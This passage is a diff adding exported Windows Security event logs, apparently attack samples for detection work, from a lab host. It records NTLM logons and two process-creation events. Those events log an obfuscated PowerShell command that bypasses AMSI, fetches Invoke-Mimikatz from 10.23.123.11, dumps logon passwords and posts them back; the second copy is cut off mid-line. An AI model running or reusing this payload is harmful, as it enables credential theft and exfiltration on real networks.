@@ -1,0 +1,2278 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.059154700Z" />
+      <EventRecordID>937758</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-7</Data>
+      <Data Name="TargetUserName">ANONYMOUS LOGON</Data>
+      <Data Name="TargetDomainName">NT AUTHORITY</Data>
+      <Data Name="TargetLogonId">0x8157add</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V1</Data>
+      <Data Name="KeyLength">0</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">54388</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.121650100Z" />
+      <EventRecordID>937761</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157afc</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">0</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">54392</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.137273900Z" />
+      <EventRecordID>937764</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157b29</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">0</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">54394</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.152903800Z" />
+      <EventRecordID>937767</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157b29</Data>
+      <Data Name="ObjectServer">SC Manager</Data>
+      <Data Name="ObjectType">SC_MANAGER OBJECT</Data>
+      <Data Name="ObjectName">ServicesActive</Data>
+      <Data Name="HandleId">0xffffd000f46659f8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%7168
+				%%7169
+				%%7170
+				%%7171
+				%%7172
+				%%7173
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x1d8</Data>
+      <Data Name="ProcessName">C:\Windows\System32\services.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.168537900Z" />
+      <EventRecordID>937770</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157b4e</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">128</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">60238</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.246658900Z" />
+      <EventRecordID>937773</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157b70</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">128</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">48446</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.309160800Z" />
+      <EventRecordID>937776</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157b8f</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">128</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">48446</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4624</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>12544</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.371666800Z" />
+      <EventRecordID>937779</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="1056" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-0-0</Data>
+      <Data Name="SubjectUserName">-</Data>
+      <Data Name="SubjectDomainName">-</Data>
+      <Data Name="SubjectLogonId">0x0</Data>
+      <Data Name="TargetUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="TargetUserName">admmig</Data>
+      <Data Name="TargetDomainName">OFFSEC</Data>
+      <Data Name="TargetLogonId">0x8157bac</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="LogonProcessName">NtLmSsp </Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+      <Data Name="WorkstationName">
+      </Data>
+      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="TransmittedServices">-</Data>
+      <Data Name="LmPackageName">NTLM V2</Data>
+      <Data Name="KeyLength">128</Data>
+      <Data Name="ProcessId">0x0</Data>
+      <Data Name="ProcessName">-</Data>
+      <Data Name="IpAddress">10.23.123.11</Data>
+      <Data Name="IpPort">48446</Data>
+      <Data Name="ImpersonationLevel">%%1833</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4688</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.635987700Z" />
+      <EventRecordID>937780</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4" ThreadID="2664" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-20</Data>
+      <Data Name="SubjectUserName">FS03VULN$</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x3e4</Data>
+      <Data Name="NewProcessId">0x108</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="TokenElevationType">%%1936</Data>
+      <Data Name="ProcessId">0x5e4</Data>
+      <Data Name="CommandLine">cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C " &amp; ( $pSHomE[4]+$pshome[30]+'x')("$( seT-VariaBLe 'OFs'  '') "+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 , 108 ,108 , 98,97 , 99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39, 43,39,111 ,109,97 ,116,105, 111, 110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 , 101, 108 , 100,40,39 ,97 , 109, 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 , 117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 , 110 ,116 , 77 , 97,110, 97 , 103, 101 , 114, 93 ,58 , 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 , 116,101 , 86 , 97 , 108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115 ,116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103,101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101, 109,46,78, 101, 116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111, 119,110 ,108 , 111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49, 49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 , 107, 97 , 116 , 122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32,73, 110 , 118,111, 107, 101 ,45 , 77, 105, 109 ,105, 107 , 97, 116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 105,108 , 101, 103,101,58 ,58,100 ,101 , 98,117,103 ,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111 ,103, 111,110, 112 ,97,115 , 115 , 119,111, 114,100 , 115 , 32 , 101, 120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101, 110,116 ,84,121, 112,101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 , 110, 47, 120,45 , 119, 119 , 119 ,45 ,102,111, 114 ,109 ,45,117, 114, 108 , 101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46, 84 ,101, 120 ,116 , 46, 69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 , 116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113, 117 , 101, 115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76, 101, 110,103,116 , 104 , 32, 61 ,32, 36 ,98 ,121,116, 101 ,115 ,46, 76, 101,110,103 ,116, 104,10, 36, 114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 , 101 , 115 , 116,46 , 71, 101, 116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101, 97,109 , 40,41, 10, 36,114 , 101 , 113, 117, 101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46, 87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 , 115 ,44,32 ,48 ,44, 32, 36 ,98, 121,116,101 ,115 , 46, 76 , 101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 , 109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117, 101,115 , 116 , 46, 71 , 101 ,116,82 ,101 , 115, 112 ,111 , 110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +"$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) " ) "</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4688</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.635987700Z" />
+      <EventRecordID>937781</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4" ThreadID="2664" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="NewProcessId">0xfdc</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
+      <Data Name="TokenElevationType">%%1936</Data>
+      <Data Name="ProcessId">0x108</Data>
+      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.635987700Z" />
+      <EventRecordID>937782</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">File</Data>
+      <Data Name="ObjectName">\Device\ConDrv</Data>
+      <Data Name="HandleId">0x4</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4416
+				%%4417
+				%%4418
+				%%4419
+				%%4420
+				%%4421
+				%%4422
+				%%4423
+				%%4424
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0xfdc</Data>
+      <Data Name="ProcessName">C:\Windows\System32\conhost.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4688</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.651484400Z" />
+      <EventRecordID>937783</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4" ThreadID="2664" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="NewProcessId">0x90c</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TokenElevationType">%%1936</Data>
+      <Data Name="ProcessId">0x108</Data>
+      <Data Name="CommandLine">powershell.exe  -exec bypass -noni -nop -w 1 -C " &amp; ( $pSHomE[4]+$pshome[30]+'x')("$( seT-VariaBLe 'OFs'  '') "+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 , 108 ,108 , 98,97 , 99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39, 43,39,111 ,109,97 ,116,105, 111, 110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 , 101, 108 , 100,40,39 ,97 , 109, 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 , 117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 , 110 ,116 , 77 , 97,110, 97 , 103, 101 , 114, 93 ,58 , 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 , 116,101 , 86 , 97 , 108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115 ,116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103,101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101, 109,46,78, 101, 116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111, 119,110 ,108 , 111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49, 49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 , 107, 97 , 116 , 122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32,73, 110 , 118,111, 107, 101 ,45 , 77, 105, 109 ,105, 107 , 97, 116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 